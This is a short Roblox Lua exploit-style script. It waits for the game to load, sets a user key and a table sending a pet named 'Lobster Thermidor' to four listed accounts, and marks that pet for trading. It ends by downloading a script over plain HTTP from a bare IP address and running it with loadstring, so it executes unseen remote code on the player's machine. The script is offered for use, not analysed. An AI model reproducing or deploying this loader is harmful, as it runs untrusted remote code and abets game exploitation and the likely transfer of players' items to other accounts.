repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.UserKey = "venoz"
_G.HostName = {
    ["Sienasees2679"] = "Lobster Thermidor",
    ["Stutecrisi37076"] = "Lobster Thermidor",
    ["Gamstoni12195"] = "Lobster Thermidor",
    ["Gobahbatha49885"] = "Lobster Thermidor",
}

_G.SelectPetForTrade = {
    "Lobster Thermidor",
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()